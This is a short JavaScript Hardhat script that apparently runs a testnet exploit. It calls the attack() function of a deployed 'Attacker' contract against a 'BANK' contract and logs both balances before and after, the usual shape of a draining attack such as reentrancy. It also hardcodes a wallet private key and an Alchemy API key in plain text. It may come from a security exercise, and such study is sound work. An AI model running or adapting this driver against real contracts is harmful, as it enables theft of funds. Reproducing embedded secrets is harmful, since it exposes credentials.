// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

let BANK = "0xE6E2EBe4f42A9593E5F857E83621Dd4f37de3C5f";
let ATTACKER = "0xEaB56c75C3F066901D2c85D8Ba41e5E0Ba734B6D";
let ATTACKERCONT = "0x13aa127123CfAcE4a360f30BecfCf3Dc4267e6B0";
let PRIVATEKEY =
	"0x8d7bf23ad10d0c4d1bdaf9168a7f447bfe9acadba1e7f43f960e30371522fdcf";

let API_KEY = "vZF-bLS5x-6QJAXdpq-LNZ4S2_TZi2_P";

async function main() {
	//it("Perform Attack", async function () {

	// For Hardhat
	const contract = require("../artifacts/contracts/Attacker.sol/Attacker.json");

	// Provider
	const alchemyProvider = new ethers.providers.AlchemyProvider(
		(network = "maticmum"),
		API_KEY
	);

	// Signer
	const owner = new ethers.Wallet(PRIVATEKEY, alchemyProvider);

	// Contract
	const attackerContract = new ethers.Contract(
		ATTACKERCONT,
		contract.abi,
		owner
	);

	console.log(`${owner.address}`);
	//console.log(JSON.stringify(contract.abi));

	console.log("");
	console.log("*** Before ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attacker's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);

	await attackerContract.attack({
		value: ethers.utils.parseEther("0.0000311365"),
	});

	console.log("");
	console.log("*** After ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attackers's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);
	console.log("");

	// expect(await ethers.provider.getBalance(this.bankContract.address)).to.eq(
	// 	0
	// );
	//});
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
